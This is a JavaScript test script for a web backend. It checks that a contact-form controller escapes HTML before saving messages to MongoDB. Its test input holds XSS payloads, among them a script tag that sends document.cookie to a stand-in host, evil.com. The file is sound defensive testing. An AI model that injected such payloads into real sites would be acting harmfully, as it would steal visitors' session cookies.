import '../config/env.js';
import mongoose from 'mongoose';
import { createContactMessage } from '../controllers/supportController.js';
import ContactMessage from '../models/ContactMessage.js';

const runTests = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI_TEST || process.env.MONGODB_URI);
    console.log('✅ MongoDB connected');

    // Test XSS Payload
    const req = {
      body: {
        name: 'Evil Attacker',
        email: 'hacker@example.com',
        subject: 'Malicious <img src=x onerror=alert(1)>',
        message: 'Hello <script>fetch("http://evil.com?c="+document.cookie)</script>'
      }
    };
    
    let statusCode;
    let jsonResponse;
    const res = {
      status: (code) => {
        statusCode = code;
        return res;
      },
      json: (data) => {
        jsonResponse = data;
      }
    };

    console.log('\n--- Running XSS Attack Simulation ---');
    await createContactMessage(req, res);
    
    const saved = await ContactMessage.findById(jsonResponse.contactMessage._id);
    console.log('Stored Subject:', saved.subject);
    console.log('Stored Message:', saved.message);

    if (saved.message.includes('&lt;script&gt;')) {
      console.log('✅ XSS Attack neutralized (HTML entities successfully escaped).');
    } else {
      console.log('❌ XSS Attack bypass detected.');
    }

    process.exit(0);
  } catch (e) {
    console.error(e);
    process.exit(1);
  }
};
runTests();
